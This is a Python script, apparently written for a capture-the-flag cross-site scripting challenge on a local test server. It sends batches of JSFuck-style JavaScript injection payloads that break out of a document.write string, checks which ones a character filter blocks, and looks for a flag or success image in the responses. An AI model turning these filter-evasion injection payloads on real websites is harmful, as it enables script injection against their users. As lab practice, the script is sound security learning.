import requests
import re

BASE_URL = "http://127.0.0.1:32887/page"

print("="*80)
print("ANALYZING SUCCESS CONDITIONS")
print("="*80)

# Let's look at the full HTML to understand what triggers success
print("\n### Test 1: Examine response structure ###")
response = requests.post(BASE_URL, data={"name": "test"})
print("Full HTML response:")
print(response.text)
print("\n" + "="*80)

# Now let's see if maybe we need to execute something that modifies the page
# or calls a specific function
print("\n### Test 2: Try to trigger JavaScript execution ###")

# The page has: document.write('Hello ' + name);
# Maybe we need to inject something that affects this

exec_payloads = [
    # Try to execute code that would show success
    ('";[][+[]]+[];//', "Undefined string"),
    ('";[][[][+[]]]+[];//', "Nested undefined"),
    
    # Try using throw to execute code
    ('";$=~[];//', "Assign bitwise NOT"),
    ('";_=![];//', "Assign false"),
    ('";_=!![];//', "Assign true"),
    
    # Try to call a function or method
    ('";[][[][+[]]];//', "Property access via undefined"),
]

for payload, desc in exec_payloads:
    print(f"\n{desc}: {payload}")
    response = requests.post(BASE_URL, data={"name": payload})
    
    # Look for any changes in response
    if "success" in response.text.lower():
        print("✓ 'success' found in response!")
        print(response.text)
    
    if "success_umbrella" in response.text:
        print("✓ SUCCESS IMAGE FOUND!")
        print(response.text)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"🚩 FLAG FOUND: {flag_match.group(0)}")
        print(f"\nFull response:\n{response.text}")

# Check if there are any hints in the CSS or JavaScript files
print("\n\n### Test 3: Check for hints in static files ###")

# Try to understand what makes it succeed
# Maybe we need to inject code that executes successfully without errors?

# Let's try various JSFuck constructions that are valid JS
valid_js = [
    ('";(![]+[])[+[]]+(![]+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!+[]]+(![]+[])[+[]];//', "Build 'false' string"),
    ('";([]+[])[~~[]];//', "Access undefined property"),
]

for payload, desc in valid_js:
    print(f"\n{desc}: {payload}")
    response = requests.post(BASE_URL, data={"name": payload})
    
    if "Sorry you can't use" in response.text:
        print("✗ BLOCKED")
        continue
    
    if "success" in response.text.lower():
        print("✓ 'success' found!")
    
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"🚩 FLAG: {flag_match.group(0)}")
        print(f"\nFull response:\n{response.text}")
    
    if 'success_umbrella' in response.text:
        print("✓ SUCCESS IMAGE!")
        print(f"\nFull response:\n{response.text}")

# Maybe the success condition is just to use ONLY the allowed characters?
# Let's check what happens with various symbol-only payloads
print("\n\n### Test 4: Pure symbol payloads ###")

symbol_only = [
    ('[]', "Just array"),
    ('()', "Just parens"),
    ('![]', "Just false"),
    ('!![]', "Just true"),
    ('[]()!+', "All JSFuck chars"),
    ('";;//', "Just break and comment"),
    ('"', "Just quote"),
    ('";', "Quote and semicolon"),
]

for payload, desc in symbol_only:
    print(f"\n{desc}: {payload}")
    response = requests.post(BASE_URL, data={"name": payload})
    
    # Check response length - might indicate different behavior
    print(f"Response length: {len(response.text)}")
    
    if "success" in response.text.lower() or "congratulations" in response.text.lower():
        print("✓ SUCCESS TEXT FOUND!")
        print(response.text)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"🚩 FLAG: {flag_match.group(0)}")
        print(f"\nFull response:\n{response.text}")
    
    if 'success_umbrella' in response.text:
        print("✓ SUCCESS IMAGE!")
        print(f"\nFull response:\n{response.text}")

print("\n" + "="*80)
print("SUCCESS CONDITION ANALYSIS COMPLETE")
print("="*80)

